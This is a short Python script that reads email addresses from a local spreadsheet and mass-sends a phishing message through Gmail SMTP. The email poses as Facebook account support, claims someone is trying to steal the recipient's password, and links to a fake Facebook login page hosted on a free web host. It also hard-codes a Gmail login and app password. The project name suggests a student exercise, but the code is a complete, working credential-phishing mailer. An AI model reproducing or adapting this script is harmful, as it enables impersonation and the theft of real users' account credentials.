import smtplib
import pandas as pd
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
import openpyxl

# reading the spreadsheet
email_list = pd.read_excel('/Users/lethuy/Desktop/EmailList.xlsx')
# getting the emails
emails = email_list['EMAIL']

#Connect to Gmail account
s = smtplib.SMTP('smtp.gmail.com', 587)
s.starttls()
s.login("facebook.acc.helpdesk@gmail.com", "zucweqamjfsoasnl")

# set up the email message
msg = MIMEText("Hi there, \n" 
    + 'According to your facebook account activity, \n' 
    + "We notice that someone is trying to get your account's password. \n" 
    + "Please change your password AS SOON AS POSSIBLE using the following link: \n" 
    + "https://fishing-group4.000webhostapp.com/facebook_login.html\n")
msg['Subject'] = 'ACTION REQUIRED!'
msg['From'] = 'facebook.acc.helpdesk@gmail.com'

#print email list
for i in emails:
    print(i)

#send email to each email address in the list
for dest in emails:
    msg['To'] = dest      
    s.sendmail("facebook.acc.helpdesk@gmail.com", dest, msg.as_string())

s.quit()